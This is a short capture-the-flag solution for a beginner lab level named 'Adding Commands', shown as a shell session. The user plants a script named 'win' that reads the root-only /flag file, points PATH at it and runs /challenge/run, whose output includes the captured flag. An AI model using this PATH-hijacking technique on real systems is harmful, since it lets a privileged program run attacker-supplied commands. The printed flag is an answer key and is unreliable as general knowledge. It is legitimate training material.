# Adding Commands

```bash
hacker@path~adding-commands:~$ which cat
/run/workspace/bin/cat
hacker@path~adding-commands:~$ ls -l /run/workspace/bin/cat
lrwxrwxrwx 1 root root 17 Jan  1  1970 /run/workspace/bin/cat -> /run/dojo/bin/cat
hacker@path~adding-commands:~$ mkdir sol
hacker@path~adding-commands:~$ cd sol
hacker@path~adding-commands:~/sol$ echo "/run/dojo/bin/cat" > /home/hacker/sol/win
hacker@path~adding-commands:~/sol$ ls -l /run/dojo/bin/cat
lrwxrwxrwx 10 root root 65 Jan  1  1970 /run/dojo/bin/cat -> /nix/store/k71apxkm38m3g34k01sb6zhysi0y7gph-coreutils-9.5/bin/cat
hacker@path~adding-commands:~/sol$ ls -l /run/dojo/bin/cat /flag
-r--------  1 root root 58 Oct 19 17:37 /flag
lrwxrwxrwx 10 root root 65 Jan  1  1970 /run/dojo/bin/cat -> /nix/store/k71apxkm38m3g34k01sb6zhysi0y7gph-coreutils-9.5/bin/cat
hacker@path~adding-commands:~/sol$ echo "/run/dojo/bin/cat /flag" > /home/hacker/sol/win
hacker@path~adding-commands:~/sol$ chmod a+x win
hacker@path~adding-commands:~/sol$ PATH=/home/hacker/sol
hacker@path~adding-commands:~/sol$ /challenge/run
Invoking 'win'....
pwn.college{cICyFVI2s07WtIsklTvSSbuS_UY.dZzNyUDL4gjN0czW}
```
